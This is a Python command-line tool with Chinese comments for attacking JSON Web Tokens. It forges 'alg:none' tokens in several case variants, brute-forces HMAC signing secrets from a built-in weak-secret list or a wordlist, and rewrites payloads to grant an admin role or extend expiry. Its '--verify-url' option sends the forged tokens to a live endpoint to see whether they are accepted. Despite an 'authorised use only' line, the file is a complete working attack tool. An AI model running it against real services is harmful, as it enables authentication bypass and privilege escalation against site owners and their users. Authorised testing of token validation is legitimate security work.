#!/usr/bin/env python3
"""
JWT 攻击测试工具

用途：检测 JWT Token 的常见安全问题，包括算法混淆、密钥爆破、签名绕过等。

使用方式：
  # 解析JWT（查看header和payload）
  python3 jwt_attack.py --token "eyJhbGci..." --decode

  # 算法混淆攻击（alg:none）
  python3 jwt_attack.py --token "eyJhbGci..." --none-attack

  # 弱密钥爆破
  python3 jwt_attack.py --token "eyJhbGci..." --crack --wordlist common_secrets.txt

  # 修改payload（篡改角色/用户ID）
  python3 jwt_attack.py --token "eyJhbGci..." --tamper '{"role":"admin","userId":1}'

  # 过期时间绕过
  python3 jwt_attack.py --token "eyJhbGci..." --expire-bypass

  # 全量测试
  python3 jwt_attack.py --token "eyJhbGci..." --all

  # 测试目标接口是否接受伪造的token
  python3 jwt_attack.py --token "eyJhbGci..." --none-attack \
    --verify-url "https://target.com/api/me" \
    --verify-header "Authorization"

注意事项：
  - 只在授权范围内使用
  - JWT攻击主要用于验证服务端是否正确校验签名
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import urllib.request
import urllib.error
from datetime import datetime, timedelta


# ── Base64 URL 编解码 ──────────────────────────────────────────────────────

def b64url_encode(data):
    """Base64 URL 安全编码（无填充）"""
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def b64url_decode(data):
    """Base64 URL 安全解码"""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


# ── JWT 解析 ──────────────────────────────────────────────────────────────

def decode_jwt(token):
    """解析JWT（不验证签名）"""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT format: expected 3 parts, got {len(parts)}")

    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    signature = parts[2]

    return header, payload, signature


def encode_jwt(header, payload, secret="", algorithm="HS256"):
    """编码JWT"""
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")))

    signing_input = f"{header_b64}.{payload_b64}"

    if algorithm == "none" or not secret:
        signature = ""
    elif algorithm == "HS256":
        sig_bytes = hmac.new(
            secret.encode("utf-8") if isinstance(secret, str) else secret,
            signing_input.encode("utf-8"),
            hashlib.sha256
        ).digest()
        signature = b64url_encode(sig_bytes)
    elif algorithm == "HS384":
        sig_bytes = hmac.new(
            secret.encode("utf-8") if isinstance(secret, str) else secret,
            signing_input.encode("utf-8"),
            hashlib.sha384
        ).digest()
        signature = b64url_encode(sig_bytes)
    elif algorithm == "HS512":
        sig_bytes = hmac.new(
            secret.encode("utf-8") if isinstance(secret, str) else secret,
            signing_input.encode("utf-8"),
            hashlib.sha512
        ).digest()
        signature = b64url_encode(sig_bytes)
    else:
        signature = ""

    return f"{header_b64}.{payload_b64}.{signature}"


# ── 攻击方法 ──────────────────────────────────────────────────────────────

def attack_none_algorithm(token):
    """算法混淆攻击 - 设置 alg 为 none"""
    header, payload, _ = decode_jwt(token)

    results = []

    # 多种 none 变体
    none_variants = ["none", "None", "NONE", "nOnE", "NoNe"]

    for variant in none_variants:
        forged_header = {**header, "alg": variant}
        # 无签名
        header_b64 = b64url_encode(json.dumps(forged_header, separators=(",", ":")))
        payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")))

        # 三种签名形式
        tokens = [
            f"{header_b64}.{payload_b64}.",        # 空签名
            f"{header_b64}.{payload_b64}",          # 无点
            f"{header_b64}.{payload_b64}.{b64url_encode(b'')}"  # 空base64
        ]

        for t in tokens:
            results.append({
                "alg": variant,
                "token": t,
                "description": f"alg={variant}, 空签名"
            })

    return results


def attack_weak_secret(token, wordlist=None):
    """弱密钥爆破"""
    header, payload, signature = decode_jwt(token)

    alg = header.get("alg", "HS256")
    if alg not in ("HS256", "HS384", "HS512"):
        return [{"error": f"算法 {alg} 不支持爆破（仅支持HMAC系列）"}]

    # 默认常见弱密钥
    default_secrets = [
        "secret", "password", "123456", "admin", "key",
        "jwt_secret", "token_secret", "my_secret", "test",
        "changeme", "default", "1234567890", "qwerty",
        "abc123", "letmein", "welcome", "monkey", "master",
        "supersecret", "jwt", "auth", "signing_key",
        "your-256-bit-secret", "your-secret-key",
        "secret_key", "app_secret", "application_secret",
        "hmac_secret", "HS256_secret", "token",
        "", " ", "null", "undefined", "true", "false",
        "0", "1", "-1", "[]", "{}",
        # 国内常见
        "admin123", "root", "123456789", "12345678",
        "xiaomi", "huawei", "alibaba", "tencent",
        "baidu", "bytedance", "meituan"
    ]

    secrets_to_try = default_secrets

    if wordlist:
        try:
            with open(wordlist, "r", encoding="utf-8", errors="replace") as f:
                secrets_to_try = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] Wordlist not found: {wordlist}, using defaults")

    # 准备验证
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
    target_sig = b64url_decode(signature)

    hash_func = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512
    }[alg]

    print(f"  [*] 爆破 {alg} 密钥 ({len(secrets_to_try)} 个候选)...")

    for i, secret in enumerate(secrets_to_try):
        secret_bytes = secret.encode("utf-8")
        computed = hmac.new(secret_bytes, signing_input, hash_func).digest()

        if hmac.compare_digest(computed, target_sig):
            return [{
                "cracked": True,
                "secret": secret,
                "algorithm": alg,
                "attempts": i + 1,
                "description": f"密钥已破解: '{secret}'"
            }]

    return [{"cracked": False, "attempts": len(secrets_to_try), "description": "未破解（可尝试更大的字典）"}]


def attack_tamper_payload(token, tamper_data, secret=""):
    """篡改 Payload"""
    header, payload, _ = decode_jwt(token)

    # 合并篡改数据
    if isinstance(tamper_data, str):
        tamper_data = json.loads(tamper_data)

    original_payload = {**payload}
    tampered_payload = {**payload, **tamper_data}

    results = []

    # 用 none 算法生成
    none_header = {**header, "alg": "none"}
    header_b64 = b64url_encode(json.dumps(none_header, separators=(",", ":")))
    payload_b64 = b64url_encode(json.dumps(tampered_payload, separators=(",", ":")))
    results.append({
        "method": "alg:none + tamper",
        "token": f"{header_b64}.{payload_b64}.",
        "changes": {k: {"from": original_payload.get(k), "to": v} for k, v in tamper_data.items()},
    })

    # 如果有密钥，用正确签名生成
    if secret:
        alg = header.get("alg", "HS256")
        forged = encode_jwt(header, tampered_payload, secret, alg)
        results.append({
            "method": f"正确签名({alg}) + tamper",
            "token": forged,
            "changes": {k: {"from": original_payload.get(k), "to": v} for k, v in tamper_data.items()},
        })

    return results


def attack_expire_bypass(token):
    """过期时间绕过"""
    header, payload, _ = decode_jwt(token)

    results = []

    # 延长过期时间
    future = int((datetime.utcnow() + timedelta(days=365)).timestamp())
    tampered = {**payload, "exp": future, "iat": int(datetime.utcnow().timestamp())}

    none_header = {**header, "alg": "none"}
    header_b64 = b64url_encode(json.dumps(none_header, separators=(",", ":")))
    payload_b64 = b64url_encode(json.dumps(tampered, separators=(",", ":")))

    results.append({
        "method": "exp延长1年 + alg:none",
        "token": f"{header_b64}.{payload_b64}.",
        "new_exp": datetime.utcfromtimestamp(future).isoformat()
    })

    # 删除exp字段
    no_exp = {k: v for k, v in payload.items() if k != "exp"}
    payload_b64_no_exp = b64url_encode(json.dumps(no_exp, separators=(",", ":")))
    results.append({
        "method": "删除exp字段 + alg:none",
        "token": f"{header_b64}.{payload_b64_no_exp}.",
    })

    return results


def verify_forged_token(token, url, header_name="Authorization", header_prefix="Bearer "):
    """验证伪造的token是否被目标接受"""
    headers = {
        header_name: f"{header_prefix}{token}",
        "User-Agent": "Mozilla/5.0"
    }

    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return {
                "accepted": True,
                "status": resp.status,
                "body_preview": body[:300]
            }
    except urllib.error.HTTPError as e:
        return {
            "accepted": e.code not in (401, 403),
            "status": e.code
        }
    except Exception as e:
        return {"accepted": False, "error": str(e)}


# ── 主程序 ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="JWT 攻击测试工具")
    parser.add_argument("--token", required=True, help="目标JWT Token")
    parser.add_argument("--decode", action="store_true", help="解析JWT（查看header/payload）")
    parser.add_argument("--none-attack", action="store_true", help="alg:none 算法混淆攻击")
    parser.add_argument("--crack", action="store_true", help="弱密钥爆破")
    parser.add_argument("--wordlist", help="爆破用的密钥字典文件")
    parser.add_argument("--tamper", help="篡改payload（JSON格式）")
    parser.add_argument("--expire-bypass", action="store_true", help="过期时间绕过")
    parser.add_argument("--all", action="store_true", help="执行所有攻击")
    parser.add_argument("--verify-url", help="用伪造token验证目标接口")
    parser.add_argument("--verify-header", default="Authorization", help="认证头名称")
    parser.add_argument("--output", help="输出JSON文件")

    args = parser.parse_args()

    token = args.token.strip()
    all_results = {}

    print(f"\n{'='*60}")
    print(f"  JWT Attack Tool")
    print(f"  Time: {datetime.now().isoformat()}")
    print(f"{'='*60}\n")

    # 解析
    try:
        header, payload, signature = decode_jwt(token)
    except Exception as e:
        print(f"[!] JWT解析失败: {e}")
        sys.exit(1)

    if args.decode or args.all:
        print("[*] JWT 解析结果:")
        print(f"  Header:  {json.dumps(header, indent=2)}")
        print(f"  Payload: {json.dumps(payload, indent=2)}")
        print(f"  Signature: {signature[:20]}...")
        print(f"  Algorithm: {header.get('alg', 'unknown')}")

        # 检查过期
        if "exp" in payload:
            exp_time = datetime.utcfromtimestamp(payload["exp"])
            is_expired = exp_time < datetime.utcnow()
            print(f"  Expires: {exp_time.isoformat()} {'(已过期!)' if is_expired else '(有效)'}")

        # 显示关键字段
        interesting_keys = ["sub", "role", "admin", "is_admin", "userId", "user_id", "uid", "email", "permissions"]
        found = {k: payload[k] for k in interesting_keys if k in payload}
        if found:
            print(f"  关键字段: {json.dumps(found)}")
        print()

        all_results["decode"] = {"header": header, "payload": payload}

    # None 攻击
    if args.none_attack or args.all:
        print("[*] alg:none 攻击...")
        none_results = attack_none_algorithm(token)
        print(f"  生成了 {len(none_results)} 个伪造token")
        all_results["none_attack"] = none_results

        # 验证
        if args.verify_url:
            print(f"  [*] 验证伪造token是否被接受...")
            for nr in none_results[:3]:  # 只测前3个
                verify = verify_forged_token(nr["token"], args.verify_url, args.verify_header)
                nr["verify_result"] = verify
                if verify.get("accepted"):
                    print(f"  [!] VULNERABLE — 伪造token被接受! (HTTP {verify['status']})")
                    break
            else:
                print(f"  [✓] 伪造token被拒绝")
        print()

    # 密钥爆破
    if args.crack or args.all:
        print("[*] 弱密钥爆破...")
        crack_results = attack_weak_secret(token, args.wordlist)
        all_results["crack"] = crack_results

        for cr in crack_results:
            if cr.get("cracked"):
                print(f"  [!] CRACKED — 密钥: '{cr['secret']}' (第{cr['attempts']}次尝试)")
            else:
                print(f"  [✓] 未破解 ({cr['attempts']}次尝试)")
        print()

    # Payload篡改
    if args.tamper or args.all:
        tamper_data = args.tamper or '{"role":"admin","is_admin":true}'
        print(f"[*] Payload 篡改: {tamper_data}")

        # 如果刚刚破解了密钥，用它签名
        secret = ""
        if "crack" in all_results:
            for cr in all_results["crack"]:
                if cr.get("cracked"):
                    secret = cr["secret"]
                    break

        tamper_results = attack_tamper_payload(token, tamper_data, secret)
        all_results["tamper"] = tamper_results

        for tr in tamper_results:
            print(f"  方法: {tr['method']}")
            print(f"  Token: {tr['token'][:80]}...")

            if args.verify_url:
                verify = verify_forged_token(tr["token"], args.verify_url, args.verify_header)
                tr["verify_result"] = verify
                if verify.get("accepted"):
                    print(f"  [!] VULNERABLE — 篡改后的token被接受!")
        print()

    # 过期绕过
    if args.expire_bypass or args.all:
        print("[*] 过期时间绕过...")
        expire_results = attack_expire_bypass(token)
        all_results["expire_bypass"] = expire_results

        for er in expire_results:
            print(f"  方法: {er['method']}")
            if args.verify_url:
                verify = verify_forged_token(er["token"], args.verify_url, args.verify_header)
                er["verify_result"] = verify
                if verify.get("accepted"):
                    print(f"  [!] VULNERABLE — 过期绕过成功!")
        print()

    # 总结
    print(f"{'='*60}")
    vulnerabilities = []
    if "none_attack" in all_results:
        for r in all_results["none_attack"]:
            if r.get("verify_result", {}).get("accepted"):
                vulnerabilities.append("alg:none 攻击有效")
                break
    if "crack" in all_results:
        for r in all_results["crack"]:
            if r.get("cracked"):
                vulnerabilities.append(f"弱密钥: {r['secret']}")
    if "tamper" in all_results:
        for r in all_results["tamper"]:
            if r.get("verify_result", {}).get("accepted"):
                vulnerabilities.append("Payload篡改有效")
                break

    if vulnerabilities:
        print(f"  [!] 发现 {len(vulnerabilities)} 个JWT安全问题:")
        for v in vulnerabilities:
            print(f"      - {v}")
    else:
        print(f"  [✓] 未发现可利用的JWT问题")
        if not args.verify_url:
            print(f"      提示: 使用 --verify-url 验证伪造token是否被目标接受")
    print(f"{'='*60}\n")

    # 输出
    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(all_results, f, ensure_ascii=False, indent=2, default=str)
        print(f"[+] 结果已保存: {args.output}")

    sys.exit(0 if not vulnerabilities else 1)


if __name__ == "__main__":
    main()
